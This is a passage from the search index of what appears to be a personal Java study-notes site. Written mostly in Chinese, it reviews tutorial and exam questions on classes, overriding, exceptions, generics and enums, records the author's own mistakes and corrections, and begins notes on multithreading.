\u58f0\u660e\u4e00\u4e2a\u53d8\u91cf\uff0c\u7528\u4e8e\u4fdd\u5b58\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\n\n    public BoolNot(BoolExpr expr) {\n        this.expr = expr; // \u5728\u6784\u9020\u51fd\u6570\u4e2d\u5c06\u4f20\u5165\u7684\u5e03\u5c14\u8868\u8fbe\u5f0f\u4fdd\u5b58\n    }\n\n    @Override\n    public void describe() {\n        System.out.print(\"!\");\n        expr.describe();\n    }\n\n    @Override\n    public boolean evaluate() {\n        return !expr.evaluate();\n    }\n}\n</code></pre> <p>\u6267\u884c <code>expr.describe\uff08\uff09;</code> Java \u4f1a\u67e5\u770b\u5f53\u524d\u5b58\u50a8\u5728 <code>expr</code> \u53d8\u91cf\u4e2d\u7684\u5bf9\u8c61\u7684\u5b9e\u9645\u7c7b\u578b \u3002</p> <ul> <li>\u5982\u679c <code>expr</code> \u5305\u542b\u4e00\u4e2a <code>BoolVal</code> \u5bf9\u8c61\uff08\u5982 <code>new BoolVal\uff08true\uff09</code>\uff09\uff0c\u5219\u5c06\u8c03\u7528 <code>BoolVal</code> \u7c7b\u4e2d\u5b9a\u4e49\u7684 <code>describe\uff08\uff09</code> \u65b9\u6cd5\uff08\u6253\u5370 <code>true</code> \u6216 <code>false</code>\uff09</li> <li>\u5982\u679c <code>expr</code> \u5305\u542b\u4e00\u4e2a <code>BoolAnd</code> \u5bf9\u8c61\uff08\u5982 <code>new BoolAnd\uff08...\uff09</code>\uff09\uff0c\u90a3\u4e48\u5728 <code>BoolAnd</code> \u7c7b\u4e2d\u5b9a\u4e49\u7684 <code>describe\uff08\uff09</code></li> <li>\u5982\u679c <code>expr</code> \u5305\u542b\u53e6\u4e00\u4e2a <code>BoolNot</code> \u5bf9\u8c61\uff08\u5982 <code>new BoolNot\uff08...\uff09</code>\uff09\uff0c\u5219\u5c06\u518d\u6b21\u8c03\u7528 <code>BoolNot</code> \u7c7b\u4e2d\u5b9a\u4e49\u7684 <code>describe\uff08\uff09</code> \u65b9\u6cd5</li> </ul>"},{"location":"cs/java/basics/t1/#booland","title":"BoolAnd","text":"<pre><code>class BoolAnd extends BoolExpr {\n    BoolExpr left;\n    BoolExpr right;\n\n    public BoolAnd(BoolExpr left, BoolExpr right) {\n        this.left = left;\n        this.right = right;\n    }\n\n    @Override\n    public void describe() {\n        System.out.print(\"(\");\n        left.describe();\n        System.out.print(\" &amp;&amp; \");\n        right.describe();\n        System.out.print(\")\");\n    }\n\n    @Override\n    public boolean evaluate() {\n        return left.evaluate() &amp;&amp; right.evaluate();\n    }\n}\n</code></pre> <p>\u8fd9\u9898\u9700\u8981\u5bf9\u7c7b\u8fd9\u4e00\u7ae0\u6709\u5f88\u597d\u7684\u7406\u89e3\uff0c\u9700\u8981\u9a6c\u4e0a\u5f25\u8865\u8fd9\u4e00\u5757\u77e5\u8bc6\u70b9</p>"},{"location":"cs/java/basics/t1/#q14","title":"Q14","text":"<p>Write a class called TempLog that represents a series of regular temperature measurements. The class must have a single constructor that takes the maximum number of measurements that will be logged in this object. The class must have a addTemp method that, given a new measurement, appends it to the log. If there is not capacity to append the measurement, it should be discarded. There should be no way to edit the measurements other than via the addTemp method. The class must have a rangeMax method that, given a pair of indices into the log, returns the maximum temperature recorded between the first and second index, inclusive. You may assume that rangeMax will only be called with indices that specify a non-empty range of measurements. The following is an example of how this class is expected to be used, and how it is expected to behave:</p> <pre><code>TempLog log = new TempLog(10); // Capacity for 10 measurements\nlog.addTemp(-4.3);\nlog.addTemp(10.5);\nlog.addTemp(18.6);\nlog.addTemp(27.9);\nlog.addTemp(22.6);\nlog.rangeMax(0, 0); // Should return -4.3\nlog.rangeMax(1, 2); // Should return 18.6\nlog.rangeMax(1, 4); // Should return 27.9\nlog.addTemp(35.0);\nlog.rangeMax(2, 5); // Should return 35.0\n</code></pre> <p>\u9898\u76ee\u63d0\u53ca\u9700\u8981\u4e00\u4e2a <code>constructor</code> \u5206\u914d <code>capacity</code>\uff0c<code>addTemp</code> \u6dfb\u52a0\u8fdb\u5217\u8868</p> <p>\u6ca1\u6709\u5bb9\u91cf\u4e86\u76f4\u63a5\u5ffd\u7565\uff0c\u5b9e\u73b0 <code>rangeMax</code> \u529f\u80fd\u3002\u521d\u6b65\u8bbe\u60f3\u5e94\u8be5\u662f\u7528\u6570\u7ec4\u7ed3\u5408\u7c7b\u5b9e\u73b0\u3002</p>"},{"location":"cs/java/basics/t1/#variables","title":"Variables","text":"<ul> <li><code>double[]</code> </li> </ul> <ul> <li><code>int capacity</code> \u5206\u914d\u7ed9\u8fd9\u4e2a <code>doubel[]</code></li> <li><code>double result</code> \u7528\u4e8e\u8bb0\u5f55\u6700\u5927\u7ed3\u679c</li> </ul>"},{"location":"cs/java/basics/t1/#function","title":"Function","text":"<ul> <li>\u5b9e\u73b0 MaxDouble \u7b97\u6cd5</li> </ul> <pre><code>public class TempLog {\n    private int len;\n    private double[] temps;\n\n    public TempLog(int capacity) {\n        len = 0;\n        temps = new double[capacity];\n    }\n\n    public void addTemp(double temp) {\n        if (len &lt; temps.length) {\n            temps[len++] = temp;\n        }\n    }\n\n    public double rangeMax(int lwr, int upr) {\n        double result = temps[upr];\n        for (int i = lwr; i &lt; upr; i++) {\n            if (temps[i] &gt; result)\n                result = temps[i];\n        }\n        return result;\n    }\n}\n</code></pre> <p>\u4ee5\u4e0a\u4e3a\u6807\u51c6\u7b54\u6848\uff0c\u5728\u91cd\u5199\u8fc7\u7a0b\u4e2d\u610f\u8bc6\u5230\u81ea\u5df1\u5bf9 Java \u7684 Array \u7406\u89e3\u4e0d\u4f73</p> <p><code>array.length</code>\uff1a\u7528\u4e8e\u6570\u7ec4 \uff08<code>[]</code>\uff09\u3002\u5b83\u662f\u4e00\u4e2a\u63d0\u4f9b\u56fa\u5b9a\u5bb9\u91cf\u7684\u5c5e\u6027\u3002</p> <p><code>collection.size\uff08\uff09</code></p> <p>\u7528\u4e8e Collection \u7c7b \uff08\u5982 <code>ArrayList</code>\uff09\u3002\u8fd9\u662f\u4e00\u4e2a\u7ed9\u51fa\u5f53\u524d\u5143\u7d20\u6570\u91cf\u7684\u65b9\u6cd5\u3002</p> <p>\u7406\u89e3\u4e86\u5168\u90e8\u4ee3\u7801\u4e4b\u540e\u81ea\u5df1\u5199\u4e00\u904d\uff0c\u7528\u4e86\u53e6\u5916\u4e00\u79cd\u65b9\u6cd5\u5b9e\u73b0 <code>rangeMax</code>\u7406\u89e3\u4e86\u8001\u5e08\u65b9\u6cd5\u7684\u4e0d\u540c</p> <pre><code>public class TempLog {\n    private double[] tempList;\n    private int len;\n\n    public TempLog(int size) {\n        tempList = new double[size];\n        len = 0; // \u7528\u4e8e\u5f80\u6570\u7ec4\u91cc\u52a8\u6001\u6dfb\u52a0\u5143\u7d20\u7528\n    }\n\n    public void addTemp(double temp) {\n        // \u7531\u4e8e Java \u6ca1\u6709 Python \u90a3\u79cd\u52a8\u6001\u6570\u7ec4\n        // \u6240\u4ee5\u9700\u8981\u786e\u4fdd fixed size \u7684\u6570\u7ec4\u6709\u8db3\u591f\u7684\u7a7a\u95f4\u6dfb\u52a0\u5143\u7d20\n        // \u56e0\u6b64 len &lt; tempList.length \u53ef\u786e\u4fdd\n        if (len &lt; tempList.length) {\n            tempList[len++] = temp;\n        }\n    }\n\n    public double rangeMax(int left, int right) {\n        /**\n         * \u7b97\u6cd5\u4e3a\u76f4\u63a5\u8bb0\u5f55 index L or R \u7684\u6570\u503c\u4e3a\u6700\u5927\u503c\uff0cloop \u4e2d\u5bf9\u6bd4\u6700\u7ec8\u8fd4\u56de result\n         */\n        double result = tempList[left];\n\n        for (int i = left; i &lt; right + 1; i++) {\n            if (result &lt; tempList[i]) {\n                result = tempList[i];\n            }\n        }\n        return result;\n    }\n}\n</code></pre> <p>\u6807\u51c6\u7b54\u6848\u4e2d\u76f4\u63a5\u5b9a\u4e49\u4e86 right index \u662f\u6700\u5927\u503c\uff0c\u56e0\u6b64\u5728\u5faa\u73af\u4e2d\u4e0d\u9700\u8981\u5305\u542b\u6700\u53f3 index</p> <p>\u56e0\u6b64\u6211\u7684\u65b9\u6cd5\u4e2d\u8981\u4e48 <code>right + 1</code> \u8981\u4e48\u5b9e\u73b0 <code>i &lt;= right</code> </p>"},{"location":"cs/java/basics/t2/","title":"2.0 T2","text":""},{"location":"cs/java/basics/t2/#q1","title":"Q1","text":"<pre><code>static Double mystery(Double[] values) {\n    if (values.length &lt; 1) throw new IllegalArgumentException();\n    Double result = values[0];\n    for (Double value : values) {\n        if (result.compareTo(value) &gt; 0) {\n            result = value;\n        }\n    }\n    return result\n}\n</code></pre> <p>What is the best description for what this method returns?</p> <p>Hint: The Java Documentation for <code>x.compareTo(y)</code> for <code>Double</code> says: This method returns the value <code>0</code> if <code>y</code> is numerically equal to <code>x</code>; a value less than <code>0</code> if <code>x</code> is numerically less than <code>y</code>; and a value greater than <code>0</code> if <code>x</code> is numerically greater than <code>y</code>.</p> <p>Select the single most correct answer.</p> <ul> <li>The minimum value in the array</li> <li>The maximum value in the array</li> <li>The median value in the array</li> <li>The last value less than the first element in the array</li> <li>The last value greater than the first element in the array</li> </ul> <p>\u8fd9\u9053\u9898\u6b63\u786e\u7b54\u6848\u662f\u52a0\u7c97\u884c\u4f46\u662f\u6211\u9009\u7684\u662f\u659c\u4f53\u884c</p> <p>\u8fd9\u9053\u9898\u7684\u6838\u5fc3\u5728\u4e8e <code>compareTo</code> \u8fd9\u4e2a\u65b9\u6cd5\uff0c\u76f8\u7b49 0, <code>x</code> \u5c0f\u8fd4\u56de -1, <code>x</code> \u5927\u8fd4\u56de 1</p> <ul> <li>5 - 6 \u884c\u7684\u6838\u5fc3\u903b\u8f91\u5728\u4e8e\u4ece\u5217\u8868\u7684\u7b2c\u4e00\u4e2a\u5143\u7d20\u5f00\u59cb\uff0c\u53ea\u8981\u5176\u5927\u4e8e\u540e\u7eed\u7684\u5143\u7d20\uff0c\u90a3\u4e48\u7ed3\u679c\u5c31\u662f\u540e\u7eed\u5143\u7d20</li> </ul> <ul> <li>\u8fd9\u4e2a\u65f6\u5019\u8303\u56f4\u5df2\u7ecf\u7f29\u5c0f\u5230\u4e86\u6b63\u786e\u4ee5\u53ca\u6211\u9009\u7684\u7b54\u6848\u4e4b\u95f4\uff0c\u7531\u4e8e\u5bf9\u53d6\u6700\u5c0f\u7b97\u6cd5\u7684\u4e0d\u719f\u6089\u6000\u7591\u5176\u65e0\u6cd5\u6b63\u786e\u8bc6\u522b\u6700\u5c0f\u6570\uff0c\u5b9e\u9645\u4e0a\u627e\u6700\u5927\u503c\u4e5f\u662f\u5982\u6b64\uff1a</li> </ul> <pre><code>if (result.compareTo(value) &gt; 0) { // \u5982\u679c result \u5927\u4e8e value\n    result = value; // \u5c06 result \u66f4\u65b0\u4e3a\u66f4\u5c0f\u7684\u503c value\n}\n</code></pre>"},{"location":"cs/java/basics/t2/#q3","title":"Q3","text":"<p>Which of the following statements about method overriding are true?</p> <p>There may be multiple correct answers. Select all of them.</p> <ul> <li>An overriding method will run the code in its body and then will automatically call the original version of the method.s</li> <li>An overriding method must have the same name as the original.</li> <li>An overriding method must have the same parameter types as the original.</li> <li>An overriding method must be marked using the <code>@Override</code> annotation or it will fail to compile.</li> </ul> <p>\u8fd9\u9053\u9898\u9519\u7684\u5f88\u53ef\u60dc\uff0c\u53ea\u9009\u4e86\u7b2c\u4e8c\u4e2a\uff0c\u7b2c\u4e09\u4e2a\u5f53\u65f6\u72b9\u8c6b\u4e86\uff0c\u628a <code>overload</code> \u4e0e <code>overide</code> \u641e\u6df7\u4e86\uff0c\u7b2c\u56db\u4e2a\u662f\u7f16\u8bd1\u5668\u4e0d\u4f1a\u62a5\u9519\u4e0d\u4ee3\u8868\u7f16\u8bd1\u5931\u8d25\u5f53\u65f6\u8bc6\u522b\u51fa\u6765\u4e86\u3002\u7b2c\u516d\u5468\u7684 Slide 11 \u4e2d\u7ed3\u5408\u95ee\u7b54\uff1a</p> <ul> <li>\u9664\u4e86 Covariant Return Types \u4e5f\u5c31\u662f\u8fd4\u56de\u5b50\u7c7b\u7c7b\u578b\u662f\u5408\u6cd5\u7684\u5916\uff0c\u5176\u4ed6\u8fd4\u56de\u7684\u7c7b\u578b\u3001\u53c2\u6570\u4ee5\u53ca\u540d\u79f0\u90fd\u5fc5\u987b\u4e0e\u7236\u7c7b\u76f8\u540c</li> </ul>"},{"location":"cs/java/basics/t2/#q6","title":"Q6","text":"<pre><code>public class Exceptional {\n    public static int counter = 0;\n\n    public static void go() throws Exception {\n        counter++;\n        try {\n            counter++;\n            if (counter &gt; 0) throw new Exception(\"Uh-oh!\");\n            counter++;\n        } catch (Exception e) {\n            counter += 10;\n        }\n        if (counter &gt; 0) throw new Exception(\"Not again!\");\n        counter++;\n    }\n\n    public static void main(String[] args) {\n        Exceptional ex = new Exceptional();\n        try {\n            ex.go();\n            counter++;\n        } catch (Exception e) {\n            counter += 10;\n        }\n        System.out.println(counter);\n    }\n}\n</code></pre> <p>\u8fd9\u9053\u9898\u95ee\u6700\u540e <code>print</code> \u7684\u662f\u5565\uff0c\u76f4\u63a5\u8fd0\u884c\u4ee3\u7801\u8dd1\u51fa\u6765\u662f <code>22</code></p> <p>\u8003\u8bd5\u7684\u65f6\u5019\u5f53\u65f6\u5bf9 <code>throw</code> \u5f02\u5e38\u540e\u7684\u673a\u5236\u4e0d\u4e86\u89e3\uff0c\u5b9e\u9645\u4e0a <code>throw</code> \u9519\u8bef\u540e\u4f1a\u5bfb\u627e\u6700\u8fd1\u80fd <code>catch</code> \u7684\u5730\u65b9\u3002\u7b2c\u4e94\u4e03\u884c\u6267\u884c\u540e\u4e3a <code>2</code>\uff0c\u7b2c\u516b\u884c\u629b\u51fa\u540e\u5230\u4e86 <code>catch</code> \u8fd9\u91cc\u88ab\u6293\u4f4f\u52a0\u4e86 <code>10</code> \u53d8\u6210\u4e86 <code>12</code>\uff0c\u5341\u4e09\u884c\u7531\u4e8e\u6ca1\u6709\u5199 <code>catch</code> \u53ea\u662f\u629b\u51fa\uff0c\u56e0\u6b64\u76f4\u63a5\u8fdb\u5165 <code>main</code> \u51fd\u6570\u4e2d\u7684 <code>catch</code> \u884c\u518d\u52a0 <code>10</code> \u6700\u7ec8\u53d8\u6210 <code>22</code>.</p> <p><code>throw</code> \u8bed\u53e5\u4f1a\u7acb\u5373\u4e2d\u65ad\u5f53\u524d\u6267\u884c\u6d41\uff0c\u5e76\u5bfb\u627e\u6700\u8fd1\u7684\u5339\u914d <code>catch</code> \u5757\uff0c\u5982\u679c\u5f53\u524d\u65b9\u6cd5\u6ca1\u6709\u5339\u914d\u7684 catch\uff0c\u5f02\u5e38\u4f1a\u5411\u4e0a\u5c42\u65b9\u6cd5\u4f20\u64ad\u3002</p>"},{"location":"cs/java/basics/t2/#q11","title":"Q11","text":"<p>\u8fd9\u9898\u7ed9\u4e86\u4e00\u534a\u5206\u6570\uff0c\u8bf4\u6211 <code>Missing &lt;T&gt; return type</code> </p> <pre><code>// Picks the specified indices from `data` and returns a list of them\nstatic ArrayList&lt;Object&gt; select(ArrayList&lt;Object&gt; data, int[] indices) {\n    ArrayList&lt;Object&gt; result = new ArrayList&lt;&gt;();\n    for (int index : indices) {\n        try {\n            result.add(data.get(index));\n        } catch (IndexOutOfBoundsException e) {\n            // Ignore invalid indices, do nothing\n        }\n    }\n    return result;\n}\n</code></pre> <p>Rewrite this as a generic method instead of using the <code>Object</code> type.</p> <p>Object \u7c7b\u6765\u521b\u5efa\u53ef\u50a8\u5b58\u4efb\u610f\u6570\u636e\u7c7b\u578b\u7684\u7c7b\uff0c\u4f46\u662f\u5b9e\u4f8b\u5316\u7684\u65f6\u5019\u9700\u8981\u7c7b\u578b\u8f6c\u6362\u5e76\u4e22\u5931\u7c7b\u578b\u68c0\u67e5</p> <pre><code>int three = (Integer) ss.pop();\n</code></pre> <p>\u6539\u6210 generics \u5b9e\u4f8b\u5316\u540e\u662f\u8fd9\u6837</p> <pre><code>GenericStack&lt;Integer&gt; intStack = new GenericStack&lt;Integer&gt;(5); \n</code></pre> <p>Java 7 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86\u83f1\u5f62\u8fd0\u7b97\u7b26 <code>&lt;&gt;</code>\u3002\u5982\u679c\u4f60\u5728\u5de6\u4fa7\u663e\u5f0f\u58f0\u660e\u4e86\u7c7b\u578b <code>RunningMaximum&lt;Integer&gt; runningMax</code>\uff0c\u7f16\u8bd1\u5668\u5c31\u53ef\u4ee5\u4ece\u5de6\u4fa7\u63a8\u65ad\u51fa\u53f3\u4fa7\u7684\u6cdb\u578b\u7c7b\u578b\uff0c\u6240\u4ee5\u4f60\u53ef\u4ee5\u5199\u6210 <code>RunningMaximum&lt;Integer&gt; runningMax = new RunningMaximum&lt;&gt;(1);</code>\uff0c\u53f3\u4fa7 <code>&lt;&gt;</code> \u4e2d\u65e0\u9700\u91cd\u590d\u7c7b\u578b\u3002</p> <p>Java 10 \u53ca\u4e4b\u540e: \u5f15\u5165\u4e86 <code>var</code>\u3002\u5982\u679c\u4f60\u5728\u53f3\u4fa7\u7684\u521d\u59cb\u5316\u8868\u8fbe\u5f0f\u4e2d\u63d0\u4f9b\u4e86\u8db3\u591f\u7684\u4fe1\u606f\u8ba9\u7f16\u8bd1\u5668\u63a8\u65ad\u51fa\u7c7b\u578b\u4f8b\u5982 <code>new RunningMaximum&lt;&gt;(1)</code>\uff0c\u5176\u4e2d <code>1</code> \u662f <code>Integer</code>\uff0c\u5982\u679c\u6784\u9020\u51fd\u6570\u63a5\u53d7 T \u7c7b\u578b\u53c2\u6570\uff0c\u7f16\u8bd1\u5668\u5c31\u80fd\u63a8\u65ad\u51fa T \u662f Integer\uff0c\u4f60\u5c31\u53ef\u4ee5\u7ed3\u5408 <code>var</code> \u548c\u83f1\u5f62\u8fd0\u7b97\u7b26\u5199\u6210 <code>var runningMax = new RunningMaximum&lt;&gt;(1);</code>\u3002</p> <p>\u53ef\u4ee5\u770b\u5230\u8fd9\u9053\u9898\u7684\u6838\u5fc3\u95ee\u9898\u5c31\u662f\u51fa\u5728\u6848\u4f8b\u91cc\u662f\u6709 1 \u4f5c\u4e3a\u53c2\u6570\u7684\u6240\u4ee5\u53ef\u4ee5 <code>&lt;&gt;</code> \u76f4\u63a5\u4f20\u518d\u52a0\u4e0a <code>var</code>\uff0c\u4f46\u662f\u8fd9\u9053\u9898 <code>Object</code> \u4e2d\u5c31\u6ca1\u6307\u5b9a <code>Arrarylist</code> \u5927\u5c0f\uff0c\u56e0\u6b64\u8981\u4e48 <code>&lt;&gt;</code> \u8981\u4e48 <code>var</code> \u9009\u4e00\u79cd\u4e0d\u80fd\u878d\u5408\uff0c\u5c5e\u4e8e\u7406\u89e3\u4e0d\u591f\u900f\u5f7b\u3002\u5728 Java \u4e2d\uff0c\u5f53\u4f60\u4f7f\u7528 <code>new</code> \u5173\u952e\u5b57\u521b\u5efa\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\u65f6\uff0c\u7d27\u8ddf\u5728\u7c7b\u540d\u540e\u9762\u7684\u62ec\u53f7 () \u7528\u6765\u8c03\u7528\u7c7b\u7684\u6784\u9020\u5668\uff08Constructor\uff09\u3002\u5f53\u4f60\u4f7f\u7528 <code>new ArrayList&lt;&gt;();</code>\u521b\u5efa <code>ArrayList</code> \u5bf9\u8c61\u65f6\uff0cJava \u4f1a\u4e3a\u5b83\u81ea\u52a8\u5904\u7406\u5bb9\u91cf\u7684\u5206\u914d</p> <pre><code>static ArrayList&lt;T&gt; select(ArrayList&lt;T&gt; data, int[] indices) {\n    var result = new ArrayList&lt;&gt;();\n    for (int index : indices) {\n        try {\n            result.add(data.get(index));\n        } catch (IndexOutOfBoundsException e) {\n            // Ignore invalid indices, do nothing\n        }\n    }\n    return result;\n}\n</code></pre> <p>\u56e0\u6b64\u8003\u8bd5\u65f6\u7b2c\u4e8c\u884c\u9519\u8bef\u5c31\u5728\u5c11\u4e86\u4e2a T\uff1a</p> <pre><code>// \u65b9\u5f0f 1\uff1a\u4f7f\u7528 var\uff0c\u4f46\u63d0\u4f9b\u53f3\u4fa7\u7c7b\u578b\u4fe1\u606f\nvar result = new ArrayList&lt;T&gt;(); \n// \u7f16\u8bd1\u5668\u6839\u636e\u53f3\u8fb9\u7684 ArrayList&lt;T&gt; \u63a8\u65ad result \u662f ArrayList&lt;T&gt;\n\n// \u65b9\u5f0f 2\uff1a\u4e0d\u4f7f\u7528 var\uff0c\u663e\u5f0f\u58f0\u660e\u7c7b\u578b\nArrayList&lt;T&gt; result = new ArrayList&lt;&gt;(); \n// \u5de6\u4fa7\u5df2\u7ecf\u6307\u5b9a\u4e86\u7c7b\u578b\uff0c\u53f3\u8fb9\u7684 &lt;&gt; \u53ef\u4ee5\u4f7f\u7528\u7c7b\u578b\u63a8\u65ad\uff08Java 7+\uff09\n</code></pre>"},{"location":"cs/java/basics/t2/#q12","title":"Q12","text":"<p>Write the following:</p> <ul> <li>An <code>enum</code> called <code>Step</code> with values <code>LEFT</code> and <code>RIGHT</code>.</li> <li>A static method <code>int displacement(Step[] steps)</code> that, given an array of steps, computes how many steps to the right of your starting point you would be if you took those steps in that sequence (negative indicates left of starting point).</li> </ul> <p>For example:</p> <pre><code>Step[] steps = new Step[]{Step.LEFT, Step.LEFT, Step.RIGHT, Step.LEFT};\nSystem.out.println(displacement(steps));  // Should print -2\n</code></pre> <pre><code>enum Step {\n    LEFT(-1), RIGHT(1);\n\n    int moveValue;\n\n    Step(int moveValue){\n        this moveValue = moveValue;\n    }\n\n    public int getValue(){\n        return moveValue;\n    }\n}\n\nstatic int displacement(Step[] steps){\n    int counter = 0;\n    for (step: steps){\n        counter = counter + step.getValue();\n    }\n    return counter;\n}\n</code></pre> <p>\u6211\u76f4\u63a5\u6309\u7167\u7b14\u8bb0\u5199\u7684\uff0c\u53cd\u9988\u63d0\u5230\u8bf4 </p> <p>- Valid enum type</p> <p>- Line 17: Missing <code>Step</code> type for <code>step</code></p> <p>\u7b2c\u4e03\u884c\u53ef\u4ee5\u770b\u5230\u5e94\u8be5\u662f <code>this.moveValue</code> \u7b2c\u5341\u4e03\u884c\u6ca1\u6709\u58f0\u660e <code>step</code> \u7c7b\u578b\u5e94\u8be5\u52a0\u4e0a <code>Step</code></p>"},{"location":"cs/java/basics/t2/#q13","title":"Q13","text":"<pre><code>abstract class Student extends Person {\n    public boolean isStudent() { return true; }\n}\n</code></pre> <p>Write the following:</p> <ul> <li>An abstract class called <code>Person</code> (from which <code>Student</code> inherits) that declares <code>isStudent()</code> as an abstract method.</li> <li>An interface called <code>Coder</code> that declares a <code>boolean canCode()</code> method.</li> <li>A non-abstract class called <code>ComputingStudent</code> that is a subclass of <code>Student</code>, inherits <code>isStudent()</code> from <code>Student</code>, and implements the <code>Coder</code> interface.</li> </ul> <p>\u4e0b\u9762\u662f\u6211\u7684\u4ee3\u7801\uff1a</p> <pre><code>public interface Coder {\n    boolean canCode();\n}\n\nabstract class Person {\n    abstract boolean isStudent();\n}\n\nclass ComputingStudent extends Student implements Coder{\n\n}\n</code></pre> <p>\u8bc4\u8bba\u63d0\u793a\u5728 <code>ComputingStudent</code>  \u7c7b\u4e2d\u5199 <code>canCode</code> \u65b9\u6cd5</p> <ul> <li>\u63a5\u53e3\u5728\u6982\u5ff5\u4e0a\u5c31\u662f\u62bd\u8c61\u7684\u3002\u663e\u5f0f\u5730\u5728\u63a5\u53e3\u58f0\u660e\u524d\u6dfb\u52a0 <code>abstract</code> \u5173\u952e\u5b57\u662f\u591a\u4f59\u7684\uff0c\u7f16\u8bd1\u5668\u4f1a\u81ea\u52a8\u5c06\u5176\u89c6\u4e3a\u62bd\u8c61\u7684\u3002\u63a5\u53e3\u65b9\u6cd5\u7684\u9ed8\u8ba4\u5c5e\u6027 (Implicitly <code>public abstract</code>)\uff0c\u6240\u4ee5\u7b2c\u4e00\u884c\u591a\u4f59\u4e86 <code>public</code></li> <li><code>implements Coder</code>\u5fc5\u987b\u5b9e\u73b0 <code>Coder</code> \u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5 <code>canCode()</code>\u3002</li> </ul>"},{"location":"cs/java/basics/t2/#q14","title":"Q14","text":"<p>\u8fd9\u9053\u9898\u6765\u4e0d\u53ca\u505a</p> <p>A substring of a string is any chunk of characters starting at some index and running for some length. For example, <code>\"TS20\"</code> is a substring of <code>\"CITS2005\"</code> starting at index 3 and of length 4.</p> <p>We say a string contains a repeated substring if the same non-empty substring appears more than once in the string. For example, <code>\"banana\"</code> has several repeated substrings, including <code>\"ana\"</code>, which appears at both indices 1 and 3.</p> <p>Write a class <code>RepeatChecker</code> which has:</p> <ul> <li>A static method <code>boolean hasRep(String str, int len)</code> that returns <code>true</code> if <code>str</code> contains a repeated substring of length <code>len</code>, and <code>false</code> otherwise.</li> <li>A static method <code>boolean hasRep(String str)</code> that returns <code>true</code> if <code>str</code> contains any repeated substring, and false otherwise.</li> </ul> <p>The efficiency of your algorithm is not important, but for full marks, you should avoid repeating code unnecessarily.</p> <p>Hint: Recall that <code>String</code> has a <code>.charAt(i)</code> method that gets the character at a specific index, and that it also has a <code>.length()</code> method that returns the number of characters in the string.</p> <p>\u5199\u4e00\u4e2a\u7c7b\u53ef\u4ee5\u8fd4\u56de\u8fd9\u4e2a\u5b57\u7b26\u4e32\u662f\u4e0d\u662f\u6709\u91cd\u590d\u5b57\u7b26\uff0c\u7b2c\u4e00\u4e2a\u65b9\u6cd5\u80fd\u81ea\u5b9a\u4e49\u91cd\u590d\u5b57\u6bb5\u7684\u957f\u5ea6</p> <pre><code>class RepeatChecker {\n    private static boolean eqSubs(String str, int i, int j, int len) {\n        for (int o = 0; o &lt; len; o++) {\n            if (str.charAt(i + o) != str.charAt(j + o)) return false;\n        }\n        return true;\n    }\n    public static boolean hasRep(String str, int len) {\n        for (int i = 0; i + len &lt;= str.length(); i++) {\n            for (int j = i + 1; j + len &lt;= str.length(); j++) {\n                if (eqSubs(str, i, j, len)) return true;\n            }\n        }\n        return false;\n    }\n    public static boolean hasRep(String str) {\n        for (int len = 1; len &lt; str.length(); len++) {\n            if (hasRep(str, len)) return true;\n        }\n        return false;\n    }\n}\n</code></pre>"},{"location":"cs/java/basics/w10/","title":"10.0 Thread, Lambda","text":""},{"location":"cs/java/basics/w10/#multi-processing","title":"Multi Processing","text":"<p>\u591a\u8fdb\u7a0b\u662f\u64cd\u4f5c\u7cfb\u7edf\u7684\u4e00\u4e2a\u6838\u5fc3\u7279\u6027\uff0c\u5b83\u5141\u8bb8\u4f60\u540c\u65f6\u8fd0\u884c\u591a\u4e2a\u7a0b\u5e8f \u3002</p> <ul> <li>\u5982\u679c\u4f60\u7684\u8ba1\u7b97\u673a\u53ea\u6709\u4e00\u4e2a\u6838\u5fc3 (single core)\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u8c03\u5ea6\u8fdb\u7a0b\uff0c\u4f7f\u5b83\u4eec\u770b\u8d77\u6765\u50cf\u662f\u5e76\u53d1\u6267\u884c\u7684 </li> </ul> <ul> <li>\u5982\u679c\u8ba1\u7b97\u673a\u6709\u591a\u4e2a\u6838\u5fc3 (multiple cores)\uff0c\u64cd\u4f5c\u7cfb\u7edf\u4f1a\u5c06\u8fd9\u4e9b\u8fdb\u7a0b\u5206\u914d\u5230\u4e0d\u540c\u7684\u6838\u5fc3\u4e0a\u6267\u884c \u3002</li> </ul> <p>\u5b9e\u73b0\u7684\u7b80\u5355\u65b9\u6cd5\u53ef\u80fd\u662f\u540c\u65f6\u8fd0\u884c\u51e0\u4e2a Java \u7a0b\u5e8f\uff0c\u4f46\u662f\u8fd9\u79cd\u65b9\u6cd5\u6709\u9650\u5236\uff0c\u8fdb\u7a0b\u4e4b\u95f4\u65e0\u6cd5\u901a\u4fe1</p>"},{"location":"cs/java/basics/w10/#multi-threading","title":"Multi Threading","text":"<p>\u5e76\u53d1\uff1a\u4e00\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\u4e5f\u53ef\u4ee5\u62e5\u6709\u591a\u4e2a\u6267\u884c\u7ebf\u7a0b\uff0c\u7528\u5904\u5982\u4e0b\uff1a</p> <ul> <li>Responsiveness</li> </ul> <p>\u6211\u4eec\u6b63\u5728\u7f16\u5199\u8bfb\u53d6\u5927\u6587\u4ef6\u7684\u4ee3\u7801\u3002\u5982\u679c\u4e3a\u4e86\u7b49\u5f85\u6587\u4ef6\u52a0\u8f7d\u800c\u4e0d\u5f97\u4e0d\u6682\u505c\u6574\u4e2a\u7a0b\u5e8f\uff0c\u90a3\u5c06\u662f\u5f88\u7cdf\u7cd5\u7684\u3002\u76f8\u53cd\uff0c\u6211\u4eec\u53ef\u4ee5\u8ba9\u4e00\u4e2a\u7ebf\u7a0b\u8bfb\u53d6\u6587\u4ef6\uff0c\u800c\u53e6\u4e00\u4e2a\u7ebf\u7a0b\u66f4\u65b0\u56fe\u5f62\u7528\u6237\u754c\u9762\uff08GUI\uff09\u6216\u6267\u884c\u5176\u4ed6\u64cd\u4f5c\u3002</p> <ul> <li>Efficiency</li> </ul> <p>\u73b0\u4ee3\u8ba1\u7b97\u673a\u901a\u5e38\u6709\u5f88\u591a\u6838\u5fc3\uff0c\u6211\u4eec\u5c06\u5e0c\u671b\u7f16\u5199\u80fd\u591f\u5229\u7528\u6240\u6709\u8fd9\u4e9b\u6838\u5fc3\u7684\u4ee3\u7801\uff0c\u4ee5\u6700\u5927\u9650\u5ea6\u5730\u63d0\u9ad8\u6548\u7387\u3002Java\u652f\u6301\u591a\u7ebf\u7a0b\u4ee3\u7801 